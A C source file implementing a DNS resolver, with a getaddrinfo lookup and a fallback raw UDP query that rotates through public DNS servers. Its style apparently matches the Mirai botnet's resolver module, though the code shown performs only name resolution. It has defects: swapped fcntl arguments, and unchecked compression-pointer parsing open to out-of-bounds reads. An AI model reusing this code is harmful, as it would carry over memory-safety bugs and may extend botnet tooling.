#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/select.h>
#include <errno.h>
#include <netdb.h>
#include <string.h>

#include "includes.h"
#include "resolv.h"
#include "util.h"
#include "rand.h"
#include "protocol.h"

void resolv_domain_to_hostname(char *dst_hostname, char *src_domain)
{
    int len = util_strlen(src_domain) + 1;
    char *lbl = dst_hostname, *dst_pos = dst_hostname + 1;
    uint8_t curr_len = 0;

    while (len-- > 0)
    {
        char c = *src_domain++;

        if (c == '.' || c == 0)
        {
            *lbl = curr_len;
            lbl = dst_pos++;
            curr_len = 0;
        }
        else
        {
            curr_len++;
            *dst_pos++ = c;
        }
    }
    *dst_pos = 0;
}

static void resolv_skip_name(uint8_t *reader, uint8_t *buffer, int *count)
{
    unsigned int jumped = 0, offset;
    *count = 1;
    while(*reader != 0)
    {
        if(*reader >= 192)
        {
            offset = (*reader)*256 + *(reader+1) - 49152;
            reader = buffer + offset - 1;
            jumped = 1;
        }
        reader = reader+1;
        if(jumped == 0)
            *count = *count + 1;
    }

    if(jumped == 1)
        *count = *count + 1;
}

struct resolv_entries *resolv_lookup(char *domain)
{
    struct resolv_entries *entries = calloc(1, sizeof (struct resolv_entries));
    
    // Ensure domain is null-terminated and log it
    int domain_len = util_strlen(domain);
#ifdef DEBUG
    printf("(unstable/resolver) attempting to resolve: '%s' (len=%d)\n", domain, domain_len);
#endif
    
    // Ensure null-terminated string
    char *safe_domain = malloc(domain_len + 1);
    if (safe_domain == NULL) {
#ifdef DEBUG
        printf("(unstable/resolver) malloc failed for domain buffer\n");
#endif
        free(entries);
        return NULL;
    }
    util_memcpy(safe_domain, domain, domain_len);
    safe_domain[domain_len] = '\0';

    // Primary method: Use getaddrinfo (most reliable, respects system config)
    struct addrinfo hints, *result, *rp;
    int s;
    
    util_zero(&hints, sizeof(struct addrinfo));
    hints.ai_family = AF_INET;        // IPv4 only
    hints.ai_socktype = SOCK_STREAM;  // Any socket type
    hints.ai_flags = AI_ADDRCONFIG;   // Only return addresses for configured address families
    
    s = getaddrinfo(safe_domain, NULL, &hints, &result);
    if (s == 0) {
#ifdef DEBUG
        printf("(unstable/resolver) getaddrinfo successful\n");
#endif
        for (rp = result; rp != NULL; rp = rp->ai_next) {
            if (rp->ai_family == AF_INET) {
                struct sockaddr_in *addr_in = (struct sockaddr_in *)rp->ai_addr;
                entries->addrs = realloc(entries->addrs, (entries->addrs_len + 1) * sizeof (ipv4_t));
                entries->addrs[entries->addrs_len++] = addr_in->sin_addr.s_addr;
#ifdef DEBUG
                printf("(unstable/resolver) getaddrinfo found: %s\n", inet_ntoa(addr_in->sin_addr));
#endif
            }
        }
        freeaddrinfo(result);
        
        if (entries->addrs_len > 0) {
#ifdef DEBUG
            printf("(unstable/resolver) resolved %s to %d ipv4 addresses via getaddrinfo\n", safe_domain, entries->addrs_len);
#endif
            free(safe_domain);
            return entries;
        }
    } else {
#ifdef DEBUG
        printf("(unstable/resolver) getaddrinfo failed: %s\n", gai_strerror(s));
#endif
    }

    // Fallback method: Custom DNS resolver with multiple servers
#ifdef DEBUG
    printf("(unstable/resolver) getaddrinfo failed, trying custom DNS resolver\n");
#endif

    char query[2048], response[2048];
    struct dnshdr *dnsh = (struct dnshdr *)query;
    char *qname = (char *)(dnsh + 1);

    resolv_domain_to_hostname(qname, safe_domain);

    struct dns_question *dnst = (struct dns_question *)(qname + util_strlen(qname) + 1);
    struct sockaddr_in addr = {0};
    int query_len = sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question);
    int tries = 0, fd = -1, i = 0;
    uint16_t dns_id = rand_next() % 0xffff;

    // Multiple DNS servers with rotation
    uint32_t dns_servers[] = {
        INET_ADDR(8,8,8,8),      // Google DNS
        INET_ADDR(8,8,4,4),      // Google DNS Secondary  
        INET_ADDR(1,1,1,1),      // Cloudflare DNS
        INET_ADDR(1,0,0,1),      // Cloudflare DNS Secondary
        INET_ADDR(9,9,9,9),      // Quad9 DNS
        INET_ADDR(208,67,222,222), // OpenDNS
        INET_ADDR(208,67,220,220)  // OpenDNS Secondary
    };
    int num_dns_servers = sizeof(dns_servers) / sizeof(dns_servers[0]);
    
    util_zero(&addr, sizeof (struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = dns_servers[0];
    addr.sin_port = htons(53);

    // Set up the dns query
    dnsh->id = dns_id;
    dnsh->opts = htons(1 << 8); // Recursion desired
    dnsh->qdcount = htons(1);
    dnst->qtype = htons(PROTO_DNS_QTYPE_A);
    dnst->qclass = htons(PROTO_DNS_QCLASS_IP);

    while (tries++ < 5)
    {
        fd_set fdset;
        struct timeval timeo;
        int nfds;
        int dns_server_index = (tries - 1) % num_dns_servers;

        if (fd != -1)
            close(fd);
        if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
#ifdef DEBUG
            printf("(unstable/resolver) failed to create socket\n");
#endif
            sleep(1);
            continue;
        }

        // Try different DNS server for each attempt
        addr.sin_addr.s_addr = dns_servers[dns_server_index];
#ifdef DEBUG
        printf("(unstable/resolver) trying DNS server %d.%d.%d.%d (attempt %d)\n", 
               (dns_servers[dns_server_index] >> 0) & 0xff,
               (dns_servers[dns_server_index] >> 8) & 0xff,
               (dns_servers[dns_server_index] >> 16) & 0xff,
               (dns_servers[dns_server_index] >> 24) & 0xff, tries);
#endif

        if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("(unstable/resolver) failed to connect to DNS server: %s\n", strerror(errno));
#endif
            sleep(1);
            continue;
        }

        if (send(fd, query, query_len, MSG_NOSIGNAL) == -1)
        {
#ifdef DEBUG
            printf("(unstable/resolver) failed to send DNS query: %s\n", strerror(errno));
#endif
            sleep(1);
            continue;
        }

        fcntl(F_SETFL, fd, O_NONBLOCK | fcntl(F_GETFL, fd, 0));
        FD_ZERO(&fdset);
        FD_SET(fd, &fdset);

        timeo.tv_sec = 5;
        timeo.tv_usec = 0;
        nfds = select(fd + 1, &fdset, NULL, NULL, &timeo);

        if (nfds == -1)
        {
#ifdef DEBUG
            printf("(unstable/resolver) select() failed\n");
#endif
            break;
        }
        else if (nfds == 0)
        {
#ifdef DEBUG
            printf("(unstable/resolver) couldn't resolve %s in time. %d tr%s\n", domain, tries, tries == 1 ? "y" : "ies");
#endif
            continue;
        }
        else if (FD_ISSET(fd, &fdset))
        {
#ifdef DEBUG
            printf("(unstable/resolver) got response from select\n");
#endif
            int ret = recvfrom(fd, response, sizeof (response), MSG_NOSIGNAL, NULL, NULL);
            char *name;
            struct dnsans *dnsa;
            uint16_t ancount;
            int stop;

            if (ret < (sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question)))
                continue;

            dnsh = (struct dnshdr *)response;
            qname = (char *)(dnsh + 1);
            dnst = (struct dns_question *)(qname + util_strlen(qname) + 1);
            name = (char *)(dnst + 1);

            if (dnsh->id != dns_id)
                continue;
            if (dnsh->ancount == 0)
                continue;

            ancount = ntohs(dnsh->ancount);
            while (ancount-- > 0)
            {
                struct dns_resource *r_data = NULL;

                resolv_skip_name(name, response, &stop);
                name = name + stop;

                r_data = (struct dns_resource *)name;
                name = name + sizeof(struct dns_resource);

                if (r_data->type == htons(PROTO_DNS_QTYPE_A) && r_data->_class == htons(PROTO_DNS_QCLASS_IP))
                {
                    if (ntohs(r_data->data_len) == 4)
                    {
                        uint32_t *p;
                        uint8_t tmp_buf[4];
                        for(i = 0; i < 4; i++)
                            tmp_buf[i] = name[i];

                        p = (uint32_t *)tmp_buf;

                        entries->addrs = realloc(entries->addrs, (entries->addrs_len + 1) * sizeof (ipv4_t));
                        entries->addrs[entries->addrs_len++] = (*p);
#ifdef DEBUG
                        printf("(unstable/resolver) found ipv4 address: %08x\n", (*p));
#endif
                    }

                    name = name + ntohs(r_data->data_len);
                } else {
                    resolv_skip_name(name, response, &stop);
                    name = name + stop;
                }
            }
        }

        break;
    }

    close(fd);
    free(safe_domain);

#ifdef DEBUG
    printf("(unstable/resolver) resolved %s to %d ipv4 addresses\n", domain, entries->addrs_len);
#endif

    if (entries->addrs_len > 0)
        return entries;
    else
    {
        resolv_entries_free(entries);
        return NULL;
    }
}

void resolv_entries_free(struct resolv_entries *entries)
{
    if (entries == NULL)
        return;
    if (entries->addrs != NULL)
        free(entries->addrs);
    free(entries);
}
